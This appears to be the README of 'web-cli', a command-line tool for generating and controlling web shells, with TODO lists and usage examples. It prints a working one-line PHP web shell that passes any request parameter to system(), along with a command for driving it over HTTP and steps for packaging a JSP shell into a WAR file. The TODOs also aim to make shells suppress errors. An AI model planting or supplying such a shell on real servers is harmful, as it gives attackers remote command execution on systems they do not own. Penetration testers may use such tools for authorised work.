# web-cli

Command line interface for web shells.

## TODO - wsgen

[] test whitelist ip sources
[] test long/short params
[] test long/short headers
[] test encoding options
[] test download / upload logic
[] change asp variables (base64Var, ADODB.Stream, bin.base64Var)
[] mark which variables in map are used in which language
[] shells should not display errors

## TODO - wsh

[] on download, background the download request to goroutine
[] test download / upload logic
[] fix flags (trimp, trims)
[] combine wsh and wsgen

https://github.com/SecurityRiskAdvisors/cmd.jsp/blob/master/cmd_readable.jsp

## Features

- feature

## Usage

```
flag usage
```

## Example use cases

### PHP Shell Upload

##### PHP Shell

```php
<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); die; }?>
```

##### Command

```
go run main.go -X GET -url http://127.0.0.1:8080/shell.php -p cmd
```

### Compile jsp to war

jar -cvf filename.war index.jsp

### Catch asp error:

```asp
On Error Resume Next
... do something...
If Err.Number <> 0 Then
... handle error
end if
```
